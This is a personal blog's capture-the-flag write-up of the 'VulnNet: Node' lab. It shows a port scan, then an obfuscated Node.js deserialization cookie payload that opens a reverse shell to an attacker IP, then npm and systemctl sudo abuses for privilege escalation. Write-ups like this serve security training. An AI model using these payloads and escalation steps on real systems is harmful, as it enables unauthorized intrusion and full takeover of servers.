<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Language" content="en">
    <meta name="color-scheme" content="light dark">

    

    <meta name="author" content="monoloc0">
    <meta name="description" content="Enumeration    Port Scan     pre code { background-color: #eee; }  # Nmap 7.80 scan initiated Fri Mar 26 20:29:24 2021 as: nmap -sV -sC -oA nmap/output vulnnetnode.thm Nmap scan report for vulnnetnode.thm (10.10.12.80) Host is up (0.055s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 8080/tcp open http Node.js Express framework |_http-title: VulnNet &amp;ndash; Your reliable news source &amp;ndash; Try Now! Service detection performed.">
    <meta name="keywords" content="infosec,bugbounty,personal">

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content=""/>
<meta name="twitter:description" content="Enumeration    Port Scan     pre code { background-color: #eee; }  # Nmap 7.80 scan initiated Fri Mar 26 20:29:24 2021 as: nmap -sV -sC -oA nmap/output vulnnetnode.thm Nmap scan report for vulnnetnode.thm (10.10.12.80) Host is up (0.055s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 8080/tcp open http Node.js Express framework |_http-title: VulnNet &amp;ndash; Your reliable news source &amp;ndash; Try Now! Service detection performed."/>

    <meta property="og:title" content="" />
<meta property="og:description" content="Enumeration    Port Scan     pre code { background-color: #eee; }  # Nmap 7.80 scan initiated Fri Mar 26 20:29:24 2021 as: nmap -sV -sC -oA nmap/output vulnnetnode.thm Nmap scan report for vulnnetnode.thm (10.10.12.80) Host is up (0.055s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 8080/tcp open http Node.js Express framework |_http-title: VulnNet &amp;ndash; Your reliable news source &amp;ndash; Try Now! Service detection performed." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://monoloc0.github.io/vulnnetnode/" /><meta property="article:section" content="" />





    <title>
   · monoloc0
</title>

    
      <link rel="canonical" href="https://monoloc0.github.io/vulnnetnode/">
    

    <link rel="preload" href="https://monoloc0.github.io/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>

    
      
      
      <link rel="stylesheet" href="https://monoloc0.github.io/css/coder.min.843ee18d510f7cb1bb49110db117b99ea65489c095d620a5d79ea71693478e77.css" integrity="sha256-hD7hjVEPfLG7SRENsRe5nqZUicCV1iCl156nFpNHjnc=" crossorigin="anonymous" media="screen" />
    

    

    

    

    

    <link rel="icon" type="image/png" href="https://monoloc0.github.io/images/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://monoloc0.github.io/images/favicon-16x16.png" sizes="16x16">

    <link rel="apple-touch-icon" href="https://monoloc0.github.io/images/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="180x180" href="https://monoloc0.github.io/images/apple-touch-icon.png">

    <meta name="generator" content="Hugo 0.89.4" />
  </head>

  
  
  <body class="preload-transitions colorscheme-light">
    

    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="https://monoloc0.github.io/">
      monoloc0
    </a>
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://monoloc0.github.io/whoami/">whoami</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://monoloc0.github.io/writeups/">writeups</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://monoloc0.github.io/resources/">resources</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


      <div class="content">
        
  <section class="container page">
  <article>
    <header>
      <h1 class="title">
        <a class="title-link" href="https://monoloc0.github.io/vulnnetnode/">
          
        </a>
      </h1>
    </header>

    <h1 id="enumeration">
  Enumeration
  <a class="heading-link" href="#enumeration">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<h2 id="port-scan">
  Port Scan
  <a class="heading-link" href="#port-scan">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<style>


pre code {
  background-color: #eee;

}


</style>

<pre tabindex="0"><code># Nmap 7.80 scan initiated Fri Mar 26 20:29:24 2021 as: nmap -sV -sC -oA nmap/output vulnnetnode.thm
Nmap scan report for vulnnetnode.thm (10.10.12.80)
Host is up (0.055s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
|_http-title: VulnNet &amp;ndash; Your reliable news source &amp;ndash; Try Now!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar 26 20:30:00 2021 -- 1 IP address (1 host up) scanned in 35.99 seconds
</code></pre><p>After playing around with the web application, the cookie caught my eye</p>
<p><img src="../../_resources/6af29885acd344f38fbba34226566994.png" alt="1f177e15b1cb0f52fcd8de3be28bab67.png"></p>
<p><img src="../../_resources/bd99d73617fd456fa320d89dd92416f7.png" alt="66ba436657bd7d7c7a8f87c628b21c1f.png"></p>
<p>I next googled for Node.js deserialization exploits:</p>
<p><a href="https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf">https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf</a></p>
<p>Useful Link for Payload creation:
<a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py</a></p>
<p><strong>Payload (Reverse Shell)</strong></p>
<pre tabindex="0"><code>{&quot;username&quot;:&quot;_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,57,46,53,46,50,48,52,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()&quot;,&quot;isGuest&quot;:true,&quot;encoding&quot;: &quot;utf-8&quot;}
</code></pre><p>I then sent the payload via burp and caught a reverse shell - nice !</p>
<h1 id="horizontal-privilege-escalation">
  Horizontal Privilege Escalation
  <a class="heading-link" href="#horizontal-privilege-escalation">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<pre tabindex="0"><code>www@vulnnet-node:/home$ sudo -l                                                                                     
Matching Defaults entries for www on vulnnet-node:                                                                  
    env_reset, mail_badpass,                                                                                        
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                        
                                                                                                                    
User www may run the following commands on vulnnet-node:                                                            
    (serv-manage) NOPASSWD: /usr/bin/npm  

</code></pre><p><a href="https://gtfobins.github.io/gtfobins/npm/#shell">https://gtfobins.github.io/gtfobins/npm/#shell</a></p>
<pre tabindex="0"><code>TF=$(mktemp -d)
echo '{&quot;scripts&quot;: {&quot;preinstall&quot;: &quot;/bin/sh&quot;}}' &gt; $TF/package.json
sudo /usr/bin/npm -C $TF --unsafe-perm i
</code></pre><h1 id="privilege-escalation">
  Privilege Escalation
  <a class="heading-link" href="#privilege-escalation">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<pre tabindex="0"><code>serv-manage@vulnnet-node:~$ sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
serv-manage@vulnnet-node:~$ 

</code></pre><p><img src="../../_resources/adc8a5058c384fe8ae634ffb21857951.png" alt="67efbec55fb6233abc09b70a8626c82d.png"></p>
<p><img src="../../_resources/de2a23c11a1c4c529284539c0e54f177.png" alt="81760744af4dbbe1afb398ee1c9ccac0.png"></p>
<p>the following command reloads the vulnnet-auto.timer and executes our reverse shell as root</p>
<p><code>sudo /bin/systemctl daemon-reload</code></p>
<p><img src="../../_resources/f474522510754b6597fcc590e3c25a84.png" alt="7a153609ea630e8140d23f01c42044b5.png"></p>

  </article>
</section>

  

      </div>

      <footer class="footer">
  <section class="container">
    ©
    
    2021
     monoloc0 


    
  </section>
</footer>

    </main>

    
      
      <script src="https://monoloc0.github.io/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js" integrity="sha256-A7F3afT5GuNWZ&#43;HyocqMFvUFYlds&#43;Q/zKzF5kmkU2qU="></script>
    

    

    

    

    

    

    

    

    
  </body>

</html>
